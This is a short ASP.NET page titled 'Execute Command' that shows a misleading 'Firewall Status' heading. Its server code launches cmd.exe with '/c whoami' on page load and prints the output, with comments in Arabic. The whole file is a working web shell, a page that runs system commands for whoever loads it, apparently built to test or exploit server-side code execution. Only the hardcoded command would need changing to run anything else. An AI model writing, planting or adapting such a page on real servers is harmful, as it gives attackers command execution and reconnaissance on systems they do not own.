<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
</head>
<body>
    <h2>Firewall Status</h2>
    <pre>
        <% 
            try 
            {
                // إعداد عملية تشغيل الأمر
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c whoami";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                
                // تشغيل العملية وقراءة المخرجات
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                
                // عرض المخرجات في الصفحة
                Response.Write("<b>Output:</b><br>" + output.Replace("\n", "<br>"));
                if (!string.IsNullOrEmpty(error))
                {
                    Response.Write("<br><b>Error:</b><br>" + error.Replace("\n", "<br>"));
                }
            }
            catch (Exception ex)
            {
                Response.Write("<b>Error executing command:</b> " + ex.Message);
            }
        %>
    </pre>
</body>
</html>
